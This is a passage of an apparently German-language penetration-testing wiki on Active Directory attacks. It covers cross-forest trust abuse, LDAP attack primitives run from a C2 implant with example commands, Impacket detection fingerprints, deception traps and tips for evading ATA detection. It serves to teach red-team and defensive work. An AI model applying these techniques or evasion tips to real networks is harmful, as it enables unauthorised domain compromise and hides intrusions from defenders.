Ein möglicher Angriffsvektor besteht darin, privilegierte gMSAs innerhalb der Domain anzugreifen. Der KDS Root Key, der für die Berechnung der Passwörter von gMSAs benötigt wird, ist im Configuration NC gespeichert. Mit SYSTEM-Berechtigungen auf einem beliebigen DC kann auf den KDS Root Key zugegriffen und können die Passwörter beliebiger gMSAs im gesamten Forest berechnet werden.

Eine detaillierte Analyse und schrittweise Anleitung finden sich unter:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ergänzender Angriff auf delegierte MSA (BadSuccessor – Missbrauch von Migrationsattributen):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Zusätzliche externe Forschung: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema-Änderungsangriff**

Diese Methode erfordert Geduld, da man auf die Erstellung neuer privilegierter AD-Objekte warten muss. Mit SYSTEM-Berechtigungen kann ein Angreifer das AD Schema ändern, um einem beliebigen Benutzer die vollständige Kontrolle über alle Klassen zu gewähren. Dies kann zu unbefugtem Zugriff und Kontrolle über neu erstellte AD-Objekte führen.

Weitere Informationen finden sich unter [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Von DA zu EA mit ADCS ESC5**

Die ADCS-ESC5-Schwachstelle zielt auf die Kontrolle über Public-Key-Infrastructure-(PKI-)Objekte ab, um ein Certificate Template zu erstellen, das die Authentifizierung als beliebiger Benutzer im Forest ermöglicht. Da sich PKI-Objekte im Configuration NC befinden, ermöglicht die Kompromittierung eines writable Child DC die Ausführung von ESC5-Angriffen.

Weitere Informationen dazu finden sich unter [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Wenn ADCS nicht vorhanden ist, kann der Angreifer die erforderlichen Komponenten einrichten, wie unter [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.<sup>[[16]](#references)</sup>

### Externe Forest-Domain – One-Way (Inbound) oder bidirektional

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

In diesem Szenario wird deiner Domäne von einer externen Domäne vertraut, wodurch du unbestimmte Berechtigungen über sie erhältst. Du musst herausfinden, welche Principals deiner Domäne welchen Zugriff auf die externe Domäne haben, und dann versuchen, dies auszunutzen:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Externe Forest-Domäne – Einseitig (Ausgehend)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

In diesem Szenario **vertraut Ihre Domain** einem Principal aus **anderen Domains** bestimmte **Berechtigungen** an.

Wenn jedoch eine **Domain von der vertrauenden Domain als vertrauenswürdig eingestuft wird**, erstellt die vertrauenswürdige Domain einen **Benutzer** mit einem **vorhersehbaren Namen**, dessen **Passwort dem Trust-Passwort entspricht**. Das bedeutet, dass es möglich ist, **auf einen Benutzer in der vertrauenden Domain zuzugreifen und so in die vertrauenswürdige Domain einzudringen**, um sie zu enumerieren und zu versuchen, weitere Berechtigungen zu erlangen:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine andere Möglichkeit, die vertrauenswürdige Domain zu kompromittieren, besteht darin, einen [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) zu finden, der in der **entgegengesetzten Richtung** des Domain Trusts eingerichtet wurde (was nicht sehr häufig vorkommt).

Eine weitere Möglichkeit, die vertrauenswürdige Domain zu kompromittieren, besteht darin, auf einem Computer zu warten, auf dem sich ein **Benutzer aus der vertrauenswürdigen Domain anmelden kann**, um sich per **RDP** anzumelden. Anschließend könnte der Angreifer Code in den RDP-Sitzungsprozess injizieren und von dort aus **auf die Ursprungsdomain des Opfers zugreifen**.\
Wenn das **Opfer außerdem seine Festplatte eingebunden hat**, könnte der Angreifer über den **RDP-Sitzungsprozess** **Backdoors** im **Autostartordner der Festplatte** ablegen. Diese Technik heißt **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Maßnahmen gegen den Missbrauch von Domain Trusts

### **SID Filtering:**

- Das Risiko von Angriffen, bei denen das SID History-Attribut über Forest Trusts hinweg ausgenutzt wird, wird durch SID Filtering gemindert, das standardmäßig für alle Forest-übergreifenden Trusts aktiviert ist. Grundlage dafür ist die Annahme, dass Trusts innerhalb eines Forests sicher sind. Microsoft betrachtet dabei den Forest und nicht die Domain als Sicherheitsgrenze.
- Es gibt jedoch einen Haken: SID Filtering kann Anwendungen und den Benutzerzugriff beeinträchtigen, weshalb es gelegentlich deaktiviert wird.

### **Selective Authentication:**

- Bei Forest-übergreifenden Trusts stellt Selective Authentication sicher, dass Benutzer aus den beiden Forests nicht automatisch authentifiziert werden. Stattdessen benötigen Benutzer explizite Berechtigungen, um auf Domains und Server innerhalb der vertrauenden Domain oder des vertrauenden Forests zuzugreifen.
- Wichtig ist, dass diese Maßnahmen nicht vor der Ausnutzung des beschreibbaren Configuration Naming Context (NC) oder Angriffen auf das Trust-Konto schützen.

[**Weitere Informationen zu Domain Trusts auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## AD-Missbrauch über LDAP durch On-Host-Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-artige LDAP-Primitives als x64 Beacon Object Files neu, die vollständig innerhalb eines On-Host-Implants (z. B. Adaptix C2) ausgeführt werden. Operatoren kompilieren das Paket mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und rufen dann über den Beacon `ldap <subcommand>` auf. Der gesamte Datenverkehr nutzt den aktuellen Sicherheitskontext der Anmeldung über LDAP (389) mit Signing/Sealing oder LDAPS (636) mit automatischer Zertifikatsvertrauensstellung. Daher sind weder SOCKS-Proxys noch Artefakte auf der Festplatte erforderlich.<sup>[[4]](#references)</sup>

### LDAP-Enumeration auf der Implant-Seite

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` und `get-groupmembers` lösen Kurznamen/OU-Pfade in vollständige DNs auf und geben die entsprechenden Objekte aus.
- `get-object`, `get-attribute` und `get-domaininfo` rufen beliebige Attribute (einschließlich Sicherheitsbeschreibungen) sowie die Forest-/Domain-Metadaten aus `rootDSE` ab.
- `get-uac`, `get-spn`, `get-delegation` und `get-rbcd` zeigen Kandidaten für Roasting, Delegationseinstellungen und vorhandene Deskriptoren für [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) direkt aus LDAP an.
- `get-acl` und `get-writable --detailed` analysieren die DACL, um Trustees, Rechte (GenericAll/WriteDACL/WriteOwner/Attribut-Schreibrechte) und Vererbung aufzulisten und so sofortige Ziele für eine ACL-Berechtigungseskalation zu liefern.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### LDAP-Schreibprimitive für Eskalation & Persistenz

- BOFs zur Objekterstellung (`add-user`, `add-computer`, `add-group`, `add-ou`) ermöglichen es dem Operator, neue Principals oder Computerkonten dort anzulegen, wo OU-Rechte bestehen. `add-groupmember`, `set-password`, `add-attribute` und `set-attribute` übernehmen direkt die Kontrolle über Ziele, sobald Schreibrechte für Eigenschaften gefunden wurden.
- ACL-orientierte Befehle wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` und `add-dcsync` wandeln WriteDACL/WriteOwner für beliebige AD-Objekte in Passwortzurücksetzungen, Kontrolle über Gruppenmitgliedschaften oder DCSync-Replikationsrechte um, ohne PowerShell-/ADSI-Artefakte zu hinterlassen. Die entsprechenden `remove-*`-Befehle entfernen eingeschleuste ACEs.

### Delegierung, Roasting und Kerberos-Missbrauch

- `add-spn`/`set-spn` machen einen kompromittierten Benutzer sofort Kerberoastable; `add-asreproastable` (UAC-Toggle) markiert ihn für AS-REP roasting, ohne das Passwort anzufassen.
- Delegierungs-Makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) ändern `msDS-AllowedToDelegateTo`, UAC-Flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` direkt vom Beacon aus. So werden Angriffspfade über constrained/unconstrained delegation und RBCD ermöglicht, ohne Remote PowerShell oder RSAT zu benötigen.

### sidHistory-Injection, OU-Verschiebung und Gestaltung der Angriffsfläche

- `add-sidhistory` injiziert privilegierte SIDs in die SID-History eines kontrollierten Principals (siehe [SID-History Injection](sid-history-injection.md)) und ermöglicht so die unauffällige Vererbung von Zugriffsrechten vollständig über LDAP/LDAPS.
- `move-object` ändert den DN/die OU von Computern oder Benutzern. Dadurch kann ein Angreifer Assets in den Geltungsbereich delegierter Rechte verschieben, bevor er `set-password`, `add-groupmember` oder `add-spn` verwendet. Unter [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) finden Sie Informationen zu Verschiebungsrechten und Vererbungsprüfungen.
- Eng begrenzte Entfernungsbefehle (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` usw.) ermöglichen ein schnelles Rollback, nachdem der Operator Zugangsdaten oder Persistenz erlangt hat, und minimieren so die Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Einige allgemeine Schutzmaßnahmen

[**Hier erfahren Sie mehr darüber, wie Sie Zugangsdaten schützen können.**](../stealing-credentials/credentials-protections.md)

### **Schutzmaßnahmen für Zugangsdaten**

- **Einschränkungen für Domain Admins**: Es wird empfohlen, Domain Admins die Anmeldung nur an Domain Controllern zu erlauben und ihre Verwendung auf anderen Hosts zu vermeiden.
- **Berechtigungen von Dienstkonten**: Dienste sollten aus Sicherheitsgründen nicht mit Domain-Admin-(DA-)Berechtigungen ausgeführt werden.
- **Zeitliche Begrenzung von Berechtigungen**: Aufgaben, die DA-Berechtigungen erfordern, sollten zeitlich begrenzt sein. Dies lässt sich wie folgt umsetzen: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Abwehr von LDAP-Relays**: Überwachen Sie die Ereignis-IDs 2889/3074/3075 und erzwingen Sie anschließend LDAP signing sowie LDAPS channel binding auf DCs/Clients, um LDAP-MITM-/Relay-Versuche zu blockieren.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protokollbasiertes Fingerprinting von Impacket-Aktivitäten

Wenn Sie gängige AD-Taktiken erkennen möchten, **sollten Sie sich nicht ausschließlich auf vom Operator kontrollierte Artefakte** wie umbenannte Binaries, Dienstnamen, temporäre Batch-Dateien oder Ausgabepfade verlassen. Erstellen Sie eine Baseline dafür, wie legitime Windows-Clients [Kerberos](kerberos-authentication.md)-, [NTLM](../ntlm/README.md)-, SMB-, LDAP-, DCE/RPC- und WMI-Datenverkehr erzeugen, und suchen Sie dann nach **Implementierungsbesonderheiten**, die auch bestehen bleiben, wenn der Operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` oder `ntlmrelayx.py` anpasst.<sup>[[8]](#references)</sup>

- **Kandidaten mit hoher Aussagekraft für sich allein** (nach Abgleich mit Ihrer eigenen Baseline):
  - Authentifiziertes DCE/RPC mit `auth_context_id = 79231 + ctx_id`
  - Mit `0xff` gefülltes DCE/RPC-Authentifizierungs-Padding
  - LDAP-Kerberos-Binds, die ein rohes Kerberos-`AP-REQ` direkt im SPNEGO-`mechToken` platzieren
  - SMB2/3-Negotiate-Anfragen mit ASCII-artigen `ClientGuid`-Werten
  - WMI-`IWbemLevel1Login::NTLMLogin` mit dem nicht standardmäßigen Namespace `//./root/cimv2`
  - Fest codierte Kerberos-Nonce-Werte
- **Besser als Korrelations-/Scoring-Merkmale geeignet**:
  - Lückenhafte oder duplizierte Kerberos-Etype-Listen, ungewöhnliche/fehlende `PA-DATA` oder eine von nativem Windows abweichende Etype-Reihenfolge in TGS-REQs
  - NTLM-Type-1-Nachrichten ohne Versionsinformationen oder Type-3-Nachrichten mit Null-Hostnamen
  - Rohes NTLMSSP statt SPNEGO in DCE/RPC, fehlende DCE/RPC-Verification-Trailer oder nicht übereinstimmende SPNEGO-/Kerberos-OIDs
  - Mehrere dieser Merkmale desselben Hosts/Benutzers derselben Sitzung bzw. desselben Zeitfensters sind viel aussagekräftiger als ein einzelnes schwaches Feld
- **Zur Anreicherung verwenden, nicht für eigenständige Alerts**:
  - Standarddateinamen, Ausgabepfade, zufällige Dienstnamen, temporäre Batch-Namen, Standardnamen von Computerkonten und toolspezifische HTTP-/WebDAV-/RDP-/MSSQL-Strings
  - Diese lassen sich leicht ändern und eignen sich am besten dazu, zu erklären, warum ein protokollübergreifender Cluster verdächtig ist
- **Betriebshinweise**:
  - Einige dieser Signale erfordern entschlüsselten Datenverkehr, [PCAP-/Zeek-Parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW oder Einblick in die Dienste
  - Prüfen Sie die Signale zunächst anhand von Samba-/Linux-Clients, Appliances und veralteter Software, bevor Sie daraus Alerts machen
  - Entwickeln Sie Erkennungen mit zunehmender Sicherheit in der Baseline schrittweise von Anreicherung über Threat Hunting bis hin zu Alerts weiter

### **Täuschungstechniken implementieren**

- Bei der Implementierung von Täuschungstechniken werden Fallen wie Köderbenutzer oder -computer eingerichtet, beispielsweise mit Passwörtern, die nie ablaufen, oder dem Flag Trusted for Delegation. Ein detaillierter Ansatz umfasst das Erstellen von Benutzern mit bestimmten Rechten oder deren Aufnahme in Gruppen mit hohen Berechtigungen.<sup>[[2]](#references)</sup>
- Ein praktisches Beispiel ist die Verwendung von Tools wie: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Weitere Informationen zur Bereitstellung von Täuschungstechniken finden Sie unter [Deploy-Deception auf GitHub](https://github.com/samratashok/Deploy-Deception).

### **Täuschung erkennen**

- **Bei Benutzerobjekten**: Zu den verdächtigen Indikatoren zählen ungewöhnliche ObjectSIDs, seltene Anmeldungen, Erstellungsdaten und wenige fehlgeschlagene Passwortversuche.
- **Allgemeine Indikatoren**: Der Vergleich der Attribute potenzieller Köderobjekte mit denen echter Objekte kann Unstimmigkeiten aufdecken. Tools wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können dabei helfen, solche Täuschungen zu erkennen.

### **Erkennungssysteme umgehen**

- **Microsoft-ATA-Erkennung umgehen**:
  - **Benutzerenumeration**: Vermeiden Sie die Enumeration von Sitzungen auf Domain Controllern, um eine Erkennung durch ATA zu verhindern.
  - **Ticket-Impersonation**: Die Verwendung von **aes**-Schlüsseln zur Ticketerstellung hilft, einer Erkennung zu entgehen, da kein Downgrade auf NTLM erfolgt.
  - **DCSync-Angriffe**: Es wird empfohlen, diese von einem Nicht-Domain-Controller auszuführen, um eine Erkennung durch ATA zu vermeiden, da die direkte Ausführung auf einem Domain Controller Alerts auslöst.

## References

- [1] [Ein Leitfaden zum Angriff auf Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Trusts für Täuschungszwecke in Active Directory fälschen](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Vom Domain Admin zum Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP-BOF-Sammlung – In-Memory-LDAP-Toolkit zur Ausnutzung von Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM-Hashes als Wortliste einsetzen](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Piraten](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket analysiert](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon – Onelogon: Übernahme von Active-Directory-Konten über Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft – Änderungen an Netlogon-Secure-Channel-Verbindungen im Zusammenhang mit CVE-2020-1472 verwalten](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Eine Reise zu vergessenen Null Sessions und MS-RPC-Schnittstellen](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID-Filter als Sicherheitsgrenze zwischen Domänen? (Teil 4) – Untersuchung zur Umgehung der SID-Filterung](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID-Filter als Sicherheitsgrenze zwischen Domänen? (Teil 5) – Golden-GMSA-Trust-Angriff: vom Child zur Parent-Domäne](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID-Filter als Sicherheitsgrenze zwischen Domänen? (Teil 6) – Schema-Change-Trust-Angriff: vom Child zur Parent-Domäne](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Von DA zu EA mit ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [In 5 Minuten von den Admins einer Child-Domäne zu Enterprise Admins eskalieren, indem AD CS missbraucht wird: eine Fortsetzung](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Ein ACE im Ärmel: DACL-Backdoors für Active Directory entwickeln](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Quellcode des NetExec-pre2k-Moduls](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema – Attribut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf – HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
